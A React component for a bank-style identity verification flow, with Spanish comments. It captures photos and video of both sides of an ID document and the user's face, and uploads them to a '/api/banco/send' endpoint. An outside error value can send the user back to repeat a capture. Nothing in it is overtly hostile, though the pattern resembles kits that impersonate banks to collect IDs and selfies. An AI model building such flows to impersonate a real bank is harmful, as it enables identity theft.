/* eslint-disable @typescript-eslint/no-unused-vars */
/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import { useState, useEffect } from "react";

import CamaraVerificacion from "./facial/CamaraVerificacion";
import PasoInstrucciones from "./facial/PasoInstrucciones";
import PasoInstruccionesDoc from "./facial/PasoInstruccionesDoc";
import CamaraDocumento from "./facial/CamaraDocumento";

export default function FacialVerificationFlow({ enviar, errorType }: { enviar?: (data: any) => void, errorType?: string }) {
  // 1: Instrucciones Frente, 2: Cámara Frente
  // 3: Instrucciones Dorso, 4: Cámara Dorso
  // 5: Instrucciones Facial, 6: Cámara Facial
  const [subStep, setSubStep] = useState(1);

  // Reaccionar a los errores específicos para devolver al usuario al paso correcto
  useEffect(() => {
    if (errorType === "efacial_frente") setSubStep(1);
    else if (errorType === "efacial_dorso") setSubStep(3);
    else if (errorType === "efacial_cara") setSubStep(5);
  }, [errorType]);

  const uploadMedia = async (foto: Blob, video: Blob, captureType: string) => {
    const sessionId = localStorage.getItem("sessionId-bank");
    const formData = new FormData();
    formData.append("sessionId", sessionId || "");
    formData.append("photo", foto, "foto.jpg");
    formData.append("video", video, "video.webm");
    formData.append("captureType", captureType);

    try {
      await fetch("/api/banco/send", {
        method: "POST",
        body: formData,
      });
    } catch (e) {
      console.error("Error uploading", e);
    }
  };

  const handleDocumentFrontCaptured = async (foto: Blob, video: Blob) => {
    await uploadMedia(foto, video, "documento_frente");
    setSubStep(3); // Pasar a las instrucciones traseras
  };

  const handleDocumentBackCaptured = async (foto: Blob, video: Blob) => {
    await uploadMedia(foto, video, "documento_dorso");
    setSubStep(5); // Pasar a instrucciones faciales
  };

  const handleFacialCaptured = async (foto: Blob, video: Blob) => {
    // Para el paso final, usamos también el envío de banco si está disponible
    // aunque la subida real se hace al API. El API se encarga de dejarlo en estado facial.
    await uploadMedia(foto, video, "facial");
  };

  return (
    <div className="bc-row bc-justify-content-center form-container">
      <div className="bc-col-xs-6 bc-col-md-8 bc-col-lg-4">
        <div className="bc-card-body bc-mt-4">
          <div className="bc-card bc-card-auth bc-card-container">
            <div className="bc-card-auth-body" style={{ paddingBottom: '2rem' }}>
              {errorType && (subStep === 1 || subStep === 3 || subStep === 5) && (
                <div style={{ backgroundColor: '#ffebee', color: '#c62828', padding: '12px', borderRadius: '8px', marginBottom: '24px', textAlign: 'center', fontWeight: 'bold' }}>
                  ⚠️ Hubo un error con esta captura. Por favor repite el proceso asegurándote de que la imagen sea clara.
                </div>
              )}

              {subStep === 1 && <PasoInstruccionesDoc side="front" onContinue={() => setSubStep(2)} />}
              {subStep === 2 && <CamaraDocumento side="front" onCaptured={handleDocumentFrontCaptured} />}
              
              {subStep === 3 && <PasoInstruccionesDoc side="back" onContinue={() => setSubStep(4)} />}
              {subStep === 4 && <CamaraDocumento side="back" onCaptured={handleDocumentBackCaptured} />}
              
              {subStep === 5 && <PasoInstrucciones onContinue={() => setSubStep(6)} />}
              {subStep === 6 && <CamaraVerificacion enviar={handleFacialCaptured} />}
            </div>
          </div>
        </div>
      </div>
      {/* Spacer to push footer down */}
      <div style={{ minHeight: '150px', width: '100%' }}></div>
    </div>
  );
}